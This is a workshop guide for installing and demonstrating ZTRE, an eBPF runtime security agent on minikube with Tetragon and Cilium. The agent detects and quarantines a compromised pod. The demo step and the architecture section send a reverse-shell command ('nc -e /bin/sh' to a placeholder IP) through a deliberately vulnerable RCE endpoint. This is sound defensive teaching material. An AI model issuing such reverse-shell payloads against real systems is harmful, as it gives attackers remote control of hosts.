# ZTRE Workshop — Minikube Installation Guide

> Kernel-to-Serverless: eBPF Runtime Security on Kubernetes  
> Cloud DevFest Surabaya '26

## Prerequisites

| Tool | Min Version | Install |
|---|---|---|
| Docker | 24+ | `curl -fsSL https://get.docker.com \| sh` |
| minikube | 1.32+ | `curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64 && sudo install minikube-linux-amd64 /usr/local/bin/minikube` |
| kubectl | 1.28+ | `curl -LO "https://dl.k8s.io/release/$(curl -Ls https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl" && sudo install kubectl /usr/local/bin/kubectl` |
| helm | 3.12+ | `curl https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 \| bash` |
| Go | 1.22+ | For building agent image |

**System Requirements:** 4 CPU cores, 4GB RAM, Linux kernel 5.8+ (BTF support for eBPF)

Check BTF support:
```bash
ls /sys/kernel/btf/vmlinux  # Must exist
```

---

## Step 1: Start Minikube Cluster

```bash
minikube start -p ztre-workshop \
    --cpus=4 \
    --memory=4096 \
    --driver=docker \
    --cni=cilium
```

Wait for node ready:
```bash
kubectl --context=ztre-workshop wait --for=condition=Ready node/ztre-workshop --timeout=120s
```

Verify Cilium:
```bash
kubectl --context=ztre-workshop wait --for=condition=Ready pods \
    -l app.kubernetes.io/name=cilium-agent \
    -n kube-system --timeout=120s
```

---

## Step 2: Install Tetragon eBPF

```bash
helm repo add cilium https://helm.cilium.io
helm repo update cilium

helm install tetragon cilium/tetragon \
    --namespace kube-system \
    --set tetragon.grpc.address="unix:///var/run/tetragon/tetragon.sock" \
    --wait --timeout 3m \
    --kube-context=ztre-workshop
```

Verify:
```bash
kubectl --context=ztre-workshop rollout status ds/tetragon -n kube-system --timeout=60s
```

---

## Step 3: Clone ZTRE Repository

```bash
git clone https://github.com/executeid/ZTRE.git
cd ZTRE
```

---

## Step 4: Deploy ZTRE Kubernetes Resources

```bash
# Namespaces
kubectl --context=ztre-workshop apply -f deploy/namespaces.yaml

# Tetragon TracingPolicy (hooks sys_execve + sys_openat)
kubectl --context=ztre-workshop apply -f deploy/tetragon-tracing-policy.yaml

# Cilium quarantine policy (auto-blocks labeled pods)
kubectl --context=ztre-workshop apply -f deploy/cilium-quarantine-policy.yaml

# RBAC (service account + pod patch + network policy permissions)
kubectl --context=ztre-workshop apply -f deploy/rbac.yaml

# Agent config (enforcement mode, risk scoring, whitelist)
kubectl --context=ztre-workshop apply -f deploy/configmap.yaml
```

---

## Step 5: Build Container Images

```bash
# Build vulnerable-web (intentionally insecure test target)
docker build -t ztre-vulnerable-web:v1 \
    -f deploy/workloads/vulnerable-web/Dockerfile \
    deploy/workloads/vulnerable-web/

# Build ZTRE Agent
docker build -t ztre-agent:v0.4.4 \
    -f deploy/Dockerfile .

# Load images into minikube
docker save ztre-vulnerable-web:v1 | minikube -p ztre-workshop image load --daemon=false -
docker save ztre-agent:v0.4.4 | minikube -p ztre-workshop image load --daemon=false -
```

---

## Step 6: Deploy Workloads

```bash
# Deploy attack target
kubectl --context=ztre-workshop apply -f deploy/workloads/vulnerable-web.yaml

# Deploy ZTRE Agent DaemonSet
kubectl --context=ztre-workshop apply -f deploy/ztre-agent-daemonset.yaml
```

**Minikube single-node fix** — remove control-plane exclusion:
```bash
kubectl --context=ztre-workshop patch ds ztre-agent -n ztre-system \
    --type=json -p '[{"op":"remove","path":"/spec/template/spec/affinity"}]'
```

Wait for everything:
```bash
kubectl --context=ztre-workshop wait --for=condition=Available \
    deployment/vulnerable-web -n ztre-test --timeout=120s

kubectl --context=ztre-workshop rollout status \
    ds/ztre-agent -n ztre-system --timeout=120s
```

---

## Step 7: Verify Deployment

```bash
# All pods should be Running
kubectl --context=ztre-workshop get pods -A

# Agent should show "Tetragon gRPC event stream established successfully"
kubectl --context=ztre-workshop logs -n ztre-system \
    -l app.kubernetes.io/name=ztre-agent --tail=10
```

Expected agent log output:
```
msg":"starting ZTRE Agent","version":"v0.4.0","mode":"enforcement"
msg":"Tetragon gRPC event stream established successfully"
msg":"Stage 3 & 4 modules initialized","containment_active":true
```

---

## Step 8: Run Attack Demo

### 8a. Check pre-attack state
```bash
kubectl --context=ztre-workshop get pods -n ztre-test -L ztre/quarantine
# QUARANTINE column should be empty
```

### 8b. Trigger reverse shell via RCE endpoint
```bash
MINIKUBE_IP=$(minikube -p ztre-workshop ip)

curl -s --max-time 5 \
    "http://${MINIKUBE_IP}:30080/exec?cmd=nc%20-e%20/bin/sh%20198.51.100.1%204444"
```

### 8c. Wait and verify quarantine (5 seconds)
```bash
sleep 5
kubectl --context=ztre-workshop get pods -n ztre-test -L ztre/quarantine
# QUARANTINE column should show "true"
```

### 8d. Check agent logs for containment proof
```bash
kubectl --context=ztre-workshop logs -n ztre-system \
    -l app.kubernetes.io/name=ztre-agent --tail=5 \
    | grep "CONTAINMENT"
```

Expected output:
```
"msg":"AUTOMATED CONTAINMENT EXECUTED SUCCESSFULLY"
"applied_label":"ztre/quarantine=true"
"risk_score":70
"latency":0.035  (sub-second!)
"forensic_status":"Pod preserved running; volatile memory intact (zero process kill)"
```

### 8e. Verify pod is still alive (not killed)
```bash
kubectl --context=ztre-workshop get pod -n ztre-test -l app=vulnerable-web \
    -o jsonpath='Phase: {.items[0].status.phase} | Restarts: {.items[0].status.containerStatuses[0].restartCount}'
# Should show: Phase: Running | Restarts: 0
```

---

## Step 9: Reset for Another Demo

```bash
POD=$(kubectl --context=ztre-workshop get pod -n ztre-test -l app=vulnerable-web \
    -o jsonpath='{.items[0].metadata.name}')

# Remove quarantine label
kubectl --context=ztre-workshop label pod -n ztre-test $POD ztre/quarantine-

# Restart deployment for clean state
kubectl --context=ztre-workshop rollout restart deployment/vulnerable-web -n ztre-test
```

---

## Step 10: Teardown

```bash
minikube delete -p ztre-workshop
```

---

## Troubleshooting

| Problem | Fix |
|---|---|
| Agent pod not scheduling | Run the affinity patch from Step 6 |
| Agent `CrashLoopBackOff` | Check `kubectl logs` — likely Tetragon socket not ready. Wait for Tetragon DaemonSet first |
| `vulnerable-web` not found by curl | Check `minikube -p ztre-workshop ip` and verify NodePort 30080 |
| Quarantine label not appearing | Check agent logs for `containment_active:true`. If false, whitelist or RBAC issue |
| `go mod download` slow during build | Normal for first build (~10s). Cached on subsequent builds |

---

## Architecture: What Happens During the Attack

```
1. Attacker   →  curl /exec?cmd=nc -e /bin/sh 198.51.100.1 4444
2. Kernel     →  Tetragon eBPF hooks sys_execve, detects /bin/sh → /usr/bin/nc
3. Agent      →  Receives gRPC event, classifies SUSPICIOUS
4. Risk Score →  Severity(100) × 0.5 + Context(50) × 0.3 + Asset(25) × 0.2 = 70
5. Decision   →  Score 70 ≥ threshold → AUTO_CONTAINMENT
6. Enforce    →  Patches pod label ztre/quarantine=true (35ms latency)
7. Cilium     →  CiliumClusterwideNetworkPolicy drops all ingress/egress
8. Forensics  →  Container stays Running, PID 1 intact, memory inspectable
```
